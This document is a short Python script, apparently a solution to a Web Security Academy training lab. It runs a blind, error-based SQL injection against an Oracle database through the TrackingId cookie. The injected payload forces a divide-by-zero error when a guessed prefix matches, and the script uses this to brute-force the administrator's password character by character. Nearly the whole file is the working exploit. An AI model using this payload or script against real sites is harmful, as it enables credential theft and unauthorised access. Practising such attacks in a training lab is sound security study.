import requests 

caracteres='1234567890abcdefghijklmnopqrstuvwxyz' 

link = 'https://0a5b00b10427fa498001c1d6008300b2.web-security-academy.net/' 
headers = { 
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36", 
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", 
    "Referer": link 
} 

regex = r'Welcome back' 

cookie_tracking_id = 'iAF6RmEUwIq4RRdz'
cookies = { 
    "TrackingId": cookie_tracking_id
    # "session": "VnLMaz1OxsIu2ejrmXojBRrMtE3FdHtJ" 
} 

response = requests.get(link, headers=headers, cookies=cookies) 
texto_html_bruto = response.text 
# print(texto_html_bruto)
print(response.status_code) 

senha = ''
count = 0
while True:
    count += 1
    for char in caracteres: 
        print(f'--> "{char}"')
        cookies = { 
            # Aqui, ta em Oracle
            "TrackingId": f"' union select case when (substr((select password from users where username='administrator'),1,{count})='{senha}{char}') then to_char(1/0) else null end from dual--", 
            "session": "vqyRVfBiB9iJkuVYMBey4Q6ceHreLU72" 
        } 

        response = requests.get(link, headers=headers, cookies=cookies) 

        codigo = response.status_code
        # print(codigo)
        if codigo != 200:
            print(f'#### {char} - {codigo}') 
            senha += char
            print(f'------------------')
            print(f'# - {senha}')
            print(f'------------------\n')
            break
    if len(senha) != count:
        break

    # print(resultados) 
print(f'>>> {senha}')
